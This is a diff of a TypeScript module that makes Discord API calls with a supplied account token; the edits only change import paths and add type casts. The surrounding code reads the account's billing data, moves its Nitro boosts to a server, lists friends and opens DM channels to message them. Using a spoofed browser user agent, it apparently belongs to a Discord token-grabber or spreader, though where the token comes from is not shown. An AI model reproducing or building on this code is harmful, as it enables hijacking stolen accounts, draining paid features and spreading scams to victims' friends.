@@ -1,6 +1,6 @@
 import fetch from 'node-fetch';
-import { config } from './config';
-import { IBoost, IChannel, IFriend, IUser } from '../interfaces/IDiscord';
+import { config } from './config.mts';
+import { IBoost, IChannel, IFriend, IUser } from '../interfaces/IDiscord.mts';
 
 export const getUserInformation = async (token: string): Promise<IUser> => {
   return await (await fetch(`https://discord.com/api/users/@me`, {
@@ -8,7 +8,7 @@ export const getUserInformation = async (token: string): Promise<IUser> => {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
       Authorization: token
     }
-  })).json();
+  })).json() as IUser;
 }
 
 export const getBillingInformation = async (token: string) => {
@@ -17,7 +17,7 @@ export const getBillingInformation = async (token: string) => {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
       Authorization: token
     }
-  })).json();
+  })).json() as string;
 }
 
 export const getAllBoosts = async (token: string): Promise<IBoost[]> => {
@@ -26,7 +26,7 @@ export const getAllBoosts = async (token: string): Promise<IBoost[]> => {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
       Authorization: token
     }
-  })).json();
+  })).json() as IBoost[];
 }
 
 export const addBoostToserver = async (token: string, discordBoosts: Array<string>) => {
@@ -49,7 +49,7 @@ export const getAllFriends = async (token: string): Promise<IFriend[]> => {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
       Authorization: token,
     }
-  })).json();
+  })).json() as IFriend[];
 }
 
 export const createFriendChannel = async (token: string, friendId: string): Promise<IChannel> => {
@@ -63,7 +63,7 @@ export const createFriendChannel = async (token: string, friendId: string): Prom
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
       Authorization: token
     }
-  })).json();
+  })).json() as IChannel;
 }
 
 export const sendMessage = async (token: string, channelId: string) => {
